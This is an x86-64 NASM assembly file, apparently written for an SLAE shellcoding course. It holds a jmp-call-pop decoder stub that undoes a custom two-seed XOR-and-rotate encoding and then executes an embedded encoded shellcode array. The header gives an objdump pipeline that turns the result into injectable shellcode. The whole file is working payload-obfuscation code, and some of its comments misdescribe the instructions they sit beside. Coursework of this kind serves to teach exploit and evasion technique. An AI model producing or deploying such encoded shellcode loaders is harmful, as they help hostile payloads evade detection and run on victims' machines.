; Filename:      decoder.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  02.02.2019
; Note:          x64 (fix: -N to linker and 7 columns to objdump)
; Assembler:     nasm -f elf64 decoder.nasm -o decoder.o
; Linker:        ld -N -m elf_x86_64 decoder.o -o decoder
; Assembly dump: objdump -d ./decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

section .text

_start:

	jmp short call_decoder            ; jmp-call-pop

decoder:

	pop rsi                           ; Load shellcode address
	xor rdi, rdi                      ; Clear rdi register (Value + Seed counter +2 )
	xor rbx, rbx                      ; Clear rax & rdx
	mul rbx                           ; Clear rax & rdx
	xor r8, r8                        ; Clear r8 registers

decode:

	mov bl, byte [rsi + rdi]          ; Load new value in bl
	mov dl, byte [rsi + rdi + 1]      ; Load new first seed in dl
	mov r8b, byte [rsi + rdi + 2]     ; Load new second seed in r8b
	xor bl, dl                        ; Check if end of shellcode (2 x 0xbb)
	jz short shellcode                ; Jump if end of decoding
	mov bl, byte [rsi + rdi]          ; Reload byte to decode in bl
	xor bl, r8b                       ; Decoding: Xor with seconde seed
	mov cl, r8b                       ; Add number of bit rotations in CL (second seed)
	rol bl, cl                        ; Decoding: Rotate right (x second seed)
	xor bl, dl                        ; Decoding: Xor with first seed
	mov cl, dl                        ; Add number of bit rotations in CL (first seed)
	ror bl, cl                        ; Decoding: Xor with first seed

	mov byte [rsi + rax], bl          ; Write value in bl to stack
	add rdi, 3                        ; Increment seed counter by 3
	inc rax                           ; Increment value counter by 1
	jmp short decode                  ; Jump to decode next value

call_decoder:
	call decoder
	shellcode: db 0x82,0x05,0x03,0x93,0x06,0x07,0x0d,0x03,0x07,0x3a,0x05,0x06,0x10,0x03,0x04,0x38,0x06,0x02,0x6b,0x06,0x05,0x18,0x03,0x08,0xdb,0x01,0x08,0x25,0x05,0x06,0xdd,0x04,0x06,0xae,0x01,0x01,0xad,0x07,0x02,0xca,0x07,0x06,0x99,0x02,0x07,0x04,0x05,0x08,0x74,0x04,0x06,0x3c,0x02,0x07,0x0b,0x02,0x06,0x90,0x07,0x01,0x13,0x02,0x01,0xcc,0x01,0x08,0xff,0x08,0x05,0x06,0x04,0x07,0x7f,0x03,0x05,0x3b,0x07,0x01,0x41,0x07,0x07,0x01,0x02,0x02,0xc9,0x07,0x07,0x76,0x02,0x01,0x17,0x01,0x08,0xaf,0x04,0x07, 0xbb, 0xbb
